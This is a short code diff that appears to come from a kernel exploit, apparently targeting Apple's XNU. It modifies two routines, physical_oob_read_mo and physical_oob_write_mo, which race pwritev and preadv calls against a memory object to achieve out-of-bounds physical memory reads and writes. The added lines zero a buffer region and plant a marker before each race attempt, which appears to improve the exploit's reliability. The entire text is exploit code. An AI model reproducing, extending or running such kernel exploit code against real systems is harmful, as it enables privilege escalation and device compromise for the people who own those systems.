@@ -451,6 +451,8 @@ kern_return_t physical_oob_read_mo(mach_port_t memoryObject, mach_vm_offset_t me
 	int w = 0;
 	for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {
 		totalAttempts++;
+		memset((void *)(pcAddress + 0x3f00), 0, offset + size);
+		*(uint64_t *)(pcAddress + 0x3f00 + offset) = randomMarker;
 		raceSync = 1;
 		errno = 0;
 		w = pwritev(readFd, &iov, 1, 0x3f00);
@@ -551,6 +553,7 @@ void physical_oob_write_mo(mach_port_t memoryObject, mach_vm_offset_t memoryObje
 		FAILURE(0);
 	}
 	for (int tryIdx = 0; tryIdx < 20; tryIdx++) {
+		memset((void *)(pcAddress + 0x3f00), 0, offset + size);
 		raceSync = 1;
 		preadv(writeFd, &iov, 1, 0x3f00);
 		while (raceSync == 1);
